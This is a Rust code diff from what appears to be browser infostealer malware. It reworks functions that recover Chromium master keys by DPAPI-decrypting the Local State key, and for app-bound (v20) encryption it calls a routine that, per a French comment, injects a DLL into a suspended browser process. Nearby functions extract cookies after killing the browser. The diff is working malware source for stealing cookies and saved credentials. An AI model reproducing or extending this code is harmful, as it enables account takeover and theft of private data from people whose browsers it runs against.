@@ -135,7 +135,7 @@ fn recover_missing_app_bound_keys() {
             continue;
         }
 
-        if let Some(k) = fetch_app_bound(&browser_name, &json, true, true) {
+        if let Some(k) = fetch_app_bound(&browser_name, true) {
             if let Some(entry) = map.get_mut(&browser_name) {
                 entry.keys.app_bound = Some(k);
             }
@@ -148,35 +148,11 @@ pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
     extract_post_kill()
 }
 
-fn fetch_app_bound(
-    browser_name: &str,
-    json: &Value,
-    has_app_bound: bool,
-    allow_inject: bool,
-) -> Option<Vec<u8>> {
-    if !has_app_bound {
+fn fetch_app_bound(browser_name: &str, allow_inject: bool) -> Option<Vec<u8>> {
+    if !allow_inject {
         return None;
     }
-    if let Some(k) = crate::browsers::common::dpf::try_from_local_state(json) {
-        if k.len() == 32 {
-            return Some(k);
-        }
-    }
-    if let Some(raw) = extract_app_bound_from_local_state(json) {
-        if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
-            if k.len() == 32 {
-                return Some(k);
-            }
-        }
-    }
-    if allow_inject {
-        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
-            if k.len() == 32 {
-                return Some(k);
-            }
-        }
-    }
-    None
+    crate::browsers::common::ci::fetch_app_bound_key(browser_name)
 }
 
 pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: bool) -> Option<MasterKeys> {
@@ -191,49 +167,23 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: 
         None => return None,
     };
     let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
+    if decoded.len() <= 5 {
+        return None;
+    }
 
-    let standard_wrapped = dpapi_decrypt(&decoded[5..], None, 0);
+    let standard = dpapi_decrypt(&decoded[5..], None, 0)?;
 
     let app_bound_key = s_app_bound_encrypted_key();
     let has_app_bound = json[&os_crypt][&app_bound_key].as_str().is_some();
 
-    if let Some(ref s) = standard_wrapped {
-        if s.len() == 32 {
-            let app_bound = fetch_app_bound(browser_name, &json, has_app_bound, allow_inject);
-            return Some(MasterKeys { standard: s.clone(), app_bound });
-        }
+    if !has_app_bound {
+        // Anciennes versions: clé AES via DPAPI uniquement (v10/v11, pas de v20).
+        return Some(MasterKeys { standard, app_bound: None });
     }
 
-    let local_app_bound = if has_app_bound {
-        crate::browsers::common::dpf::try_from_local_state(&json)
-    } else {
-        None
-    };
-
-    if let (Some(ref wrapped), Some(ref ab)) = (&standard_wrapped, &local_app_bound) {
-        if wrapped.len() >= 15 {
-            if let Some(unwrapped) = aead_decrypt(wrapped, ab) {
-                return Some(MasterKeys { standard: unwrapped, app_bound: Some(ab.clone()) });
-            }
-        }
-    }
-
-    if has_app_bound {
-        if let Some(k) = fetch_app_bound(browser_name, &json, true, allow_inject) {
-            let standard = standard_wrapped.clone().unwrap_or_default();
-            return Some(MasterKeys { standard, app_bound: Some(k) });
-        }
-    }
-
-    if let Some(s) = standard_wrapped {
-        if !s.is_empty() {
-            return Some(MasterKeys { standard: s, app_bound: local_app_bound });
-        }
-    }
-    if let Some(ab) = local_app_bound {
-        return Some(MasterKeys { standard: Vec::new(), app_bound: Some(ab) });
-    }
-    None
+    // Nouvelles versions (app_bound / v20): inject DLL dans un process suspendu.
+    let app_bound = fetch_app_bound(browser_name, allow_inject);
+    Some(MasterKeys { standard, app_bound })
 }
 
 fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
